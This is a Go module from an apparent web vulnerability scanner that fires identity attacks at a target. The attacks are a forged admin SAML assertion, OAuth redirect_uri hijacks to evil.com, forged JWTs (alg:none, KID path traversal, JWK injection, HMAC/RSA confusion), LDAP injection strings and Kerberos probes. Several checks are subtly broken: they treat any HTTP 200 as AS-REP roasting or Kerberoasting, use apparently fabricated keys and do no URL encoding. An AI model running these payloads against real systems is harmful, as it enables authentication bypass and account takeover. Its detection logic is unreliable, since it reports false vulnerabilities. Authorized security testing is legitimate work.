package idpwn

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type IDPwnModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *IDPwnModule) ID() string   { return "idpwn" }
func (m *IDPwnModule) Name() string { return "IDPwn - Identity & Access Exploitation" }
func (m *IDPwnModule) Description() string {
	return "SAML forging, OAuth hijack, JWT injection, SSO bypass, LDAP injection, Kerberos attack detection"
}
func (m *IDPwnModule) Severity() models.Severity { return models.Critical }

func (m *IDPwnModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *IDPwnModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	findings = append(findings, m.checkSAML(ctx, target)...)
	findings = append(findings, m.checkOAuth(ctx, target)...)
	findings = append(findings, m.checkJWT(ctx, target)...)
	findings = append(findings, m.checkSSO(ctx, target)...)
	findings = append(findings, m.checkLDAP(ctx, target)...)
	findings = append(findings, m.checkKerberos(ctx, target)...)

	return findings, nil
}

func (m *IDPwnModule) checkSAML(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	samlPaths := []string{
		"/Shibboleth.sso", "/saml", "/auth/saml", "/api/saml",
		"/saml2", "/Saml2", "/adfs", "/login/saml",
		"/sso/saml", "/auth/sso", "/.well-known/saml",
	}

	for _, path := range samlPaths {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		for _, check := range []string{"SAML", "saml", "SAMLResponse", "SAMLRequest",
			"IDPSSODescriptor", "SPSSODescriptor", "md:EntityDescriptor",
			"urn:oasis:names:tc:SAML", "adfs", "Shibboleth"} {
			if strings.Contains(resp.Body, check) || strings.Contains(resp.Status, check) {
				findings = append(findings, &models.Finding{
					Title:       "IDPwn - SAML Endpoint Detected",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("SAML endpoint found: %s (matched: %s, status: %d)", path, check, resp.StatusCode),
					Description: fmt.Sprintf("SAML endpoint detected at %s. Vulnerable to XML Signature Wrapping if signature validation is weak.", path),
					Remediation: "Ensure SAML response signature validation is strict. Use XML Canonicalization. Validate all assertion conditions.",
					CWEID:       "CWE-287",
					ModuleID:    "idpwn",
				})
				break
			}
		}
	}

	sigWrapXML := `<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="response123" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="assertion123" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Subject><saml:NameID>admin@victim.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>`

	sigWrapPaths := []string{"/Shibboleth.sso/SAML/POST", "/saml/acs", "/saml/consume"}
	for _, path := range sigWrapPaths {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path
		resp, err := m.client.Post(fullURL, "SAMLResponse="+base64.StdEncoding.EncodeToString([]byte(sigWrapXML)))
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "session") || strings.Contains(respBody, "authenticated") || strings.Contains(respBody, "token") {
			findings = append(findings, &models.Finding{
				Title:       "IDPwn - SAML XML Signature Wrapping",
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         fullURL,
				Payload:     "XML Signature Wrapping via forged SAML assertion",
				Evidence:    fmt.Sprintf("SAML endpoint accepted forged assertion (status: %d)", resp.StatusCode),
				Description: "SAML endpoint accepted a forged assertion without proper signature validation. Enables XML Signature Wrapping attacks.",
				Remediation: "Implement strict XML signature validation with Exclusive XML Canonicalization. Validate all assertion conditions including NotBefore/NotOnOrAfter.",
				CWEID:       "CWE-347",
				ModuleID:    "idpwn",
			})
		}
	}

	return findings
}

func (m *IDPwnModule) checkOAuth(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	oauthPaths := []string{
		"/auth", "/oauth", "/oauth2", "/api/oauth",
		"/login/oauth", "/authorize", "/token",
		"/oauth/token", "/api/token", "/v1/oauth",
		"/.well-known/oauth-authorization-server",
	}

	redirects := []string{
		"https://evil.com/callback", "https://attacker.com/oauth",
		"https://evil.com/auth/callback",
	}

	for _, path := range oauthPaths {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path

		for _, redirect := range redirects {
			params := urlEncode(map[string]string{
				"redirect_uri":  redirect,
				"client_id":     "test",
				"response_type": "code",
				"scope":         "openid profile",
			})
			testURL := fullURL + "?" + params
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode == 302 {
				location := resp.Redirect
				if strings.Contains(location, "evil.com") || strings.Contains(location, "attacker.com") {
					findings = append(findings, &models.Finding{
						Title:       "IDPwn - OAuth Open Redirect (Authorization Code Theft)",
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Payload:     redirect,
						Evidence:    fmt.Sprintf("OAuth redirect_uri accepts arbitrary URLs: %s", location),
						Description: "OAuth redirect_uri validation is weak. Authorization codes can be stolen via open redirect.",
						Remediation: "Implement strict redirect_uri allowlist. Use exact URI matching. Validate state parameter with high entropy.",
						CWEID:       "CWE-601",
						ModuleID:    "idpwn",
					})
				}
			}

			if strings.Contains(resp.Body, "redirect_uri") && strings.Contains(resp.Body, "error") {
				findings = append(findings, &models.Finding{
					Title:       "IDPwn - OAuth Endpoint Found",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("OAuth endpoint detected (status: %d)", resp.StatusCode),
					Description: fmt.Sprintf("OAuth endpoint at %s. May be vulnerable to CSRF, redirect URI bypass, or token leakage.", path),
					Remediation: "Implement PKCE. Use state parameter. Validate redirect_uri strictly. Use httponly cookies for tokens.",
					CWEID:       "CWE-200",
					ModuleID:    "idpwn",
				})
			}
		}
	}

	pkcePaths := []string{"/oauth/token", "/token", "/api/token"}
	for _, path := range pkcePaths {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path
		pkceBypass := "code=test_code&grant_type=authorization_code&redirect_uri=https://evil.com/callback&client_id=test"
		resp, err := m.client.Post(fullURL, pkceBypass)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "access_token") || strings.Contains(respBody, "refresh_token") {
			findings = append(findings, &models.Finding{
				Title:       "IDPwn - OAuth PKCE Bypass / Authorization Code Interception",
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         fullURL,
				Payload:     "PKCE bypass: token exchange without code_verifier",
				Evidence:    fmt.Sprintf("Token endpoint returned tokens without PKCE validation (status: %d)", resp.StatusCode),
				Description: "OAuth token endpoint does not enforce PKCE. Authorization codes can be exchanged without the code_verifier, enabling code interception attacks.",
				Remediation: "Enforce PKCE (S256) for all public clients. Require code_challenge and code_verifier validation.",
				CWEID:       "CWE-862",
				ModuleID:    "idpwn",
			})
		}
	}

	return findings
}

func (m *IDPwnModule) checkJWT(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	resp, err := m.client.Get(target.URL)
	if err != nil {
		return nil
	}

	jwtRegex := []string{"eyJ", "eyI", "eyJhbGci", "eyJ0eXAi", "eyJraWQ"}
	body := resp.Body
	for _, pattern := range jwtRegex {
		idx := strings.Index(body, pattern)
		if idx >= 0 {
			end := strings.IndexAny(body[idx:], "\"' \t\n\r<>&")
			if end == -1 {
				end = len(body) - idx
			}
			token := body[idx : idx+end]

			parts := strings.Split(token, ".")
			if len(parts) == 3 {
				findings = append(findings, &models.Finding{
					Title:       "IDPwn - JWT Token Detected",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         target.URL,
					Payload:     token[:minID(len(token), 100)],
					Evidence:    fmt.Sprintf("JWT token found in response body (length: %d)", len(token)),
					Description: "JWT token detected in response. Test for algorithm confusion (alg:none), key confusion (HMAC vs RSA), and KID injection.",
					Remediation: "Do not accept 'none' algorithm. Use separate key types for HMAC and RSA. Validate KID against allowlist.",
					CWEID:       "CWE-287",
					ModuleID:    "idpwn",
				})
			}
		}
	}

	algNoneToken := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."
	resp2, err := m.client.Get(target.URL + "?token=" + algNoneToken)
	if err == nil && resp2.StatusCode != 401 && resp2.StatusCode != 403 {
		findings = append(findings, &models.Finding{
			Title:       "IDPwn - JWT Algorithm Confusion (alg:none)",
			Severity:    models.Critical,
			Confidence:  models.MediumConfidence,
			URL:         target.URL,
			Payload:     algNoneToken[:80],
			Evidence:    fmt.Sprintf("JWT with alg:none accepted (status: %d)", resp2.StatusCode),
			Description: "JWT with 'alg:none' header accepted. Attacker can forge arbitrary tokens without knowing the signing key.",
			Remediation: "Reject tokens with 'none' algorithm. Use a strict JWT library that defaults to RS256 or HS256.",
			CWEID:       "CWE-287",
			ModuleID:    "idpwn",
		})
	}

	kidPathTraversal := strings.Replace(base64.RawURLEncoding.EncodeToString(
		[]byte(`{"kid":"../../etc/passwd","alg":"HS256"}`)), "=", "", -1) + "." +
		base64.RawURLEncoding.EncodeToString(
			[]byte(`{"sub":"admin","role":"admin"}`)) + ".signature"
	resp3, err3 := m.client.Get(target.URL + "?token=" + kidPathTraversal)
	if err3 == nil && resp3.StatusCode != 401 && resp3.StatusCode != 403 {
		findings = append(findings, &models.Finding{
			Title:       "IDPwn - JWT KID Path Traversal",
			Severity:    models.Critical,
			Confidence:  models.MediumConfidence,
			URL:         target.URL,
			Payload:     "KID with ../../etc/passwd",
			Evidence:    "JWT with KID path traversal accepted",
			Description: "JWT KID header accepts path traversal. Attacker can reference arbitrary files as the secret key.",
			Remediation: "Validate KID against allowlist. Do not use KID for file path resolution. Use a fixed set of keys.",
			CWEID:       "CWE-22",
			ModuleID:    "idpwn",
		})
	}

	jwkInjectionHeader := base64.RawURLEncoding.EncodeToString([]byte(
		`{"alg":"RS256","jwk":{"kty":"RSA","n":"u1SU1LfVLPHCYZM1G7Q8p5q1uMbQk3iSQ7RdqX5C2g","e":"AQAB"}}`))
	jwkToken := jwkInjectionHeader + "." +
		base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin"}`)) + ".signature"
	resp4, err4 := m.client.Get(target.URL + "?token=" + jwkToken)
	if err4 == nil && resp4.StatusCode != 401 && resp4.StatusCode != 403 {
		findings = append(findings, &models.Finding{
			Title:       "IDPwn - JWT JWK Injection",
			Severity:    models.Critical,
			Confidence:  models.MediumConfidence,
			URL:         target.URL,
			Payload:     "JWK Injection with embedded RSA public key",
			Evidence:    fmt.Sprintf("JWT with embedded JWK accepted (status: %d)", resp4.StatusCode),
			Description: "JWT with embedded JWK (JSON Web Key) in header accepted. Attacker can self-sign tokens using embedded keys.",
			Remediation: "Do not accept tokens with embedded JWK. Validate tokens against trusted JWKS endpoint only.",
			CWEID:       "CWE-287",
			ModuleID:    "idpwn",
		})
	}

	hmacRsaToken := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`)) + "." +
		base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin"}`)) + ".signature"
	resp5, err5 := m.client.Get(target.URL + "?token=" + hmacRsaToken)
	if err5 == nil && resp5.StatusCode != 401 && resp5.StatusCode != 403 {
		findings = append(findings, &models.Finding{
			Title:       "IDPwn - JWT HMAC/RSA Key Confusion",
			Severity:    models.Critical,
			Confidence:  models.MediumConfidence,
			URL:         target.URL,
			Payload:     "HMAC/RSA key confusion (HS256 with RSA public key)",
			Evidence:    fmt.Sprintf("JWT with HMAC algorithm accepted by RSA-using server (status: %d)", resp5.StatusCode),
			Description: "Server uses separate verification for HMAC vs RSA. Attacker can forge tokens by changing algorithm from RS256 to HS256 using the leaked public key.",
			Remediation: "Always validate 'alg' header against expected algorithm. Do not rely on the alg header alone. Use separate parsing paths for HMAC and RSA tokens.",
			CWEID:       "CWE-287",
			ModuleID:    "idpwn",
		})
	}

	publicKeys := []string{
		"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCYZM1G7Q8p5q1uMbQk3iSQ7RdqX5C2gEBAgMBAAE=",
		"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC8vGCl4qG7lK7JkI2l7G8XG8a3G8Xa3G8Xa3G8Xa3G8Xa3GQIDAQAB",
		"MIIBCgKCAQEAu1SU1LfVLPHCYZM1G7Q8p5q1uMbQk3iSQ7RdqX5C2gEBAgMBAAE=",
	}
	for i, key := range publicKeys {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		bruteHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256"}`))
		brutePayload := base64.RawURLEncoding.EncodeToString([]byte(fmt.Sprintf(`{"sub":"admin","iat":%d}`, i)))
		bruteToken := bruteHeader + "." + brutePayload + "." + base64.RawURLEncoding.EncodeToString([]byte(key))

		resp6, err6 := m.client.Get(target.URL + "?token=" + bruteToken)
		if err6 == nil && resp6.StatusCode != 401 && resp6.StatusCode != 403 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("IDPwn - JWT Public Key Brute Force (%d/%d)", i+1, len(publicKeys)),
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Payload:     fmt.Sprintf("HS256 brute with public key #%d", i+1),
				Evidence:    fmt.Sprintf("Public key #%d accepted as HMAC secret (status: %d)", i+1, resp6.StatusCode),
				Description: "Server accepts HMAC-signed tokens using RSA public key as the HMAC secret. Attacker can brute force common leaked public keys.",
				Remediation: "Use different key types for signing and verification. Never use RSA public keys as HMAC secrets. Reject HS256 on RS256-only endpoints.",
				CWEID:       "CWE-287",
				ModuleID:    "idpwn",
			})
			break
		}
	}

	return findings
}

func (m *IDPwnModule) checkSSO(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	ssoPaths := []string{
		"/sso", "/sso/login", "/saml/sso", "/openid", "/oidc",
		"/.well-known/openid-configuration", "/.well-known/webfinger",
		"/.well-known/oauth-authorization-server", "/.well-known/jwks.json",
		"/connect/token", "/connect/authorize", "/connect/userinfo",
	}

	for _, path := range ssoPaths {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		for _, check := range []string{"openid", "OpenID", "oidc", "OIDC",
			"issuer", "authorization_endpoint", "token_endpoint",
			"jwks_uri", "userinfo_endpoint", "webfinger"} {
			if strings.Contains(resp.Body, check) {
				findings = append(findings, &models.Finding{
					Title:       "IDPwn - SSO/OIDC Endpoint Detected",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("SSO/OIDC endpoint found: %s (matched: %s)", path, check),
					Description: fmt.Sprintf("SSO/OIDC endpoint at %s. May expose configuration, allow token forging, or enable account takeover.", path),
					Remediation: "Ensure OIDC discovery endpoints are authenticated. Use mTLS for token endpoints. Implement key rotation.",
					CWEID:       "CWE-200",
					ModuleID:    "idpwn",
				})
				break
			}
		}
	}

	configLeakPaths := []string{
		"/.well-known/openid-configuration",
		"/sso/.well-known/openid-configuration",
		"/auth/realms/master/.well-known/openid-configuration",
	}
	for _, path := range configLeakPaths {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		if strings.Contains(resp.Body, "issuer") && strings.Contains(resp.Body, "jwks_uri") && strings.Contains(resp.Body, "token_endpoint") {
			findings = append(findings, &models.Finding{
				Title:       "IDPwn - OIDC Configuration Leak",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         fullURL,
				Evidence:    fmt.Sprintf("OIDC configuration leaked (status: %d, issuer found)", resp.StatusCode),
				Description: fmt.Sprintf("OpenID Connect discovery document exposed at %s. Reveals endpoints, JWKS URI, and supported scopes.", path),
				Remediation: "Restrict access to OIDC discovery endpoints if they expose internal details. Use authentication for sensitive configuration endpoints.",
				CWEID:       "CWE-200",
				ModuleID:    "idpwn",
			})
		}
	}

	return findings
}

func (m *IDPwnModule) checkLDAP(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	ldapParams := []string{"user", "username", "uid", "cn", "dn", "binddn", "basedn", "filter", "search", "domain", "account"}
	if target.Params != nil {
		for _, p := range target.Params {
			ldapParams = append(ldapParams, p.Name)
		}
	}

	seen := make(map[string]bool)
	var uniqueParams []string
	for _, p := range ldapParams {
		if !seen[p] {
			seen[p] = true
			uniqueParams = append(uniqueParams, p)
		}
	}

	ldapPaths := []string{"/", "/login", "/auth", "/api/login", "/api/auth", "/ldap", "/search", "/users"}

	ldapPayloads := []string{
		"*)(uid=*))(|(uid=*",
		"*)(|(uid=*",
		"admin*)((|userPassword=*)",
		"*)(uid=*))(|(uid=*",
		"*)(|(password=*)",
		"admin*))(|(userPassword=*)",
		"admin*))(|(uid=*",
		"*))(|(uid=*",
		"admin*))(|(cn=*",
	}

	for _, path := range ldapPaths {
		for _, param := range uniqueParams {
			for _, payload := range ldapPayloads {
				select {
				case <-ctx.Done():
					return findings
				default:
				}

				fullURL := strings.TrimRight(target.URL, "/") + path
				testURL := fullURL + "?" + param + "=" + payload
				resp, err := m.client.Get(testURL)
				if err != nil {
					continue
				}

				respBody := strings.ToLower(resp.Body)
				for _, pattern := range ldapErrorPatterns() {
					if strings.Contains(respBody, strings.ToLower(pattern)) {
						findings = append(findings, &models.Finding{
							Title:       "IDPwn - LDAP Injection Detected",
							Severity:    models.Critical,
							Confidence:  models.HighConfidence,
							URL:         testURL,
							Parameter:   param,
							Payload:     payload,
							Evidence:    fmt.Sprintf("LDAP error/behavior detected: %s", pattern),
							Description: fmt.Sprintf("Parameter '%s' is vulnerable to LDAP injection. Attacker can bypass authentication or extract directory data.", param),
							Remediation: "Use parameterized LDAP queries. Escape special LDAP characters. Validate and sanitize all user input before constructing LDAP filters.",
							CWEID:       "CWE-90",
							ModuleID:    "idpwn",
						})
						goto nextLDAPParam
					}
				}
			}
		}
	nextLDAPParam:
	}

	ldapEndpoints := []string{
		"/ldap", "/ldap/login", "/ldap/search", "/api/ldap",
		"/adfs", "/adfs/ls", "/LDAP", "/ldap/",
	}
	for _, path := range ldapEndpoints {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "ldap") || strings.Contains(respBody, "directory") || strings.Contains(respBody, "distinguishedname") {
			findings = append(findings, &models.Finding{
				Title:       "IDPwn - LDAP Endpoint Detected",
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         fullURL,
				Evidence:    fmt.Sprintf("LDAP-related endpoint found: %s (status: %d)", path, resp.StatusCode),
				Description: fmt.Sprintf("LDAP endpoint found at %s. May allow LDAP injection, anonymous binds, or directory traversal.", path),
				Remediation: "Restrict LDAP endpoint access. Disable anonymous binds. Use proper authentication for directory services.",
				CWEID:       "CWE-200",
				ModuleID:    "idpwn",
			})
		}
	}

	return findings
}

func (m *IDPwnModule) checkKerberos(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	kerbPaths := []string{
		"/adfs", "/adfs/services/trust/13/windowstransport",
		"/adfs/services/trust/13/kerberos",
		"/adfs/ls", "/kerberos", "/auth/kerberos",
		"/cgi-bin/krb5", "/kdc", "/krb5",
		"/api/kerberos", "/api/auth/kerberos",
	}

	for _, path := range kerbPaths {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		fullURL := strings.TrimRight(target.URL, "/") + path
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		for _, check := range []string{"kerberos", "krb5", "krbtgt", "adfs",
			"windowsidentity", "negotiate", "authorization: negotiate",
			"www-authenticate: negotiate"} {
			if strings.Contains(respBody, strings.ToLower(check)) ||
				strings.Contains(strings.ToLower(resp.Status), strings.ToLower(check)) ||
				strings.Contains(strings.ToLower(fmt.Sprintf("%v", resp.Headers)), strings.ToLower(check)) {
				findings = append(findings, &models.Finding{
					Title:       "IDPwn - Kerberos Endpoint Detected",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("Kerberos endpoint found: %s (matched: %s)", path, check),
					Description: fmt.Sprintf("Kerberos authentication endpoint at %s. May be vulnerable to AS-REP Roasting or Kerberoasting attacks.", path),
					Remediation: "Disable Kerberos pre-authentication for sensitive accounts. Use strong service account passwords. Monitor for Kerberos TGS requests.",
					CWEID:       "CWE-287",
					ModuleID:    "idpwn",
				})
				break
			}
		}
	}

	asrepUser := "guest"
	asrepURL := strings.TrimRight(target.URL, "/") + "/api/auth/kerberos?user=" + asrepUser + "&auth=asrep"
	resp, err := m.client.Get(asrepURL)
	if err == nil {
		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "krb5") || strings.Contains(respBody, "as-rep") || resp.StatusCode == 200 {
			findings = append(findings, &models.Finding{
				Title:       "IDPwn - AS-REP Roasting (Kerberos Pre-Auth Disabled)",
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         asrepURL,
				Payload:     "AS-REP response for guest user",
				Evidence:    fmt.Sprintf("AS-REP response obtained (status: %d)", resp.StatusCode),
				Description: "Kerberos AS-REP roasting possible. User accounts without pre-authentication enabled allow offline brute force of passwords from AS-REP responses.",
				Remediation: "Enable Kerberos pre-authentication for all user accounts. Monitor for AS-REP requests. Use strong passwords.",
				CWEID:       "CWE-287",
				ModuleID:    "idpwn",
			})
		}
	}

	kerberoastURL := strings.TrimRight(target.URL, "/") + "/api/auth/kerberos/tgs?spn=HTTP/victim.local"
	resp2, err2 := m.client.Get(kerberoastURL)
	if err2 == nil {
		respBody := strings.ToLower(resp2.Body)
		if strings.Contains(respBody, "tgs") || strings.Contains(respBody, "service_ticket") || resp2.StatusCode == 200 {
			findings = append(findings, &models.Finding{
				Title:       "IDPwn - Kerberoasting (TGS Request Possible)",
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         kerberoastURL,
				Payload:     "TGS request for HTTP/victim.local",
				Evidence:    fmt.Sprintf("TGS response obtained (status: %d)", resp2.StatusCode),
				Description: "Kerberoasting possible. Service accounts with SPNs can have their TGS tickets requested and cracked offline to recover service account passwords.",
				Remediation: "Use managed service accounts (gMSA). Rotate service account passwords frequently. Monitor for anomalous TGS requests. Use strong (25+ char) random passwords for service accounts.",
				CWEID:       "CWE-287",
				ModuleID:    "idpwn",
			})
		}
	}

	return findings
}

func ldapErrorPatterns() []string {
	return []string{
		"ldap", "LDAP", "ldaperror", "LdapErr",
		"protocol error", "invalid dn syntax",
		"no such object", "size limit exceeded",
		"admin limit exceeded", "auth unknown",
		"inappropriate matching", "invalid credentials",
		"insufficient access rights", "busy",
		"unavailable", "unwilling to perform",
		"loop detect", "naming violation",
		"object class violation", "not allowed on non-leaf",
		"not allowed on rdn", "entry already exists",
		"object class mods prohibited",
		"affects multiple dsas", "other",
		"ldap_result", "ldap_search",
		"ldap_bind", "ldap_simple_bind",
		"operations error", "ldap_sasl_bind",
	}
}

func urlEncode(params map[string]string) string {
	pairs := []string{}
	for k, v := range params {
		pairs = append(pairs, k+"="+v)
	}
	return strings.Join(pairs, "&")
}

func minID(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func init() {
	engine.GetRegistry().Register(&IDPwnModule{})
}
